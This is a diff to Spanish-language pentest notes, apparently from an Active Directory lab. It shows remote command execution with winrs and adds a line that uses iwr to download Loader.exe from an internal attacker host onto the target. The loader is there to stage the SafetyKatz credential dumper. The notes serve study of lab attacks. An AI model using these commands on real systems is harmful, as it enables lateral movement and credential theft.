@@ -321,9 +321,9 @@ En caso de que haya algun usuario conectado podemos acceder a el usando winrm
 winrs -r:dcorp-mgmt cmd /c "set computername && set username"
 ```
 
-En ese ususario le podemos cargar el *Loader* para que ejecute *safetyKatz*
+En ese ususario le podemos cargar el *Loader* para copiarle el *safetyKatz*
 ```shell
-
+iwr http://172.16.100.x/Loader.exe -OutFile C:\Users\Public\Loader.exe
 ```
 
 #### Uncosntrained delegation
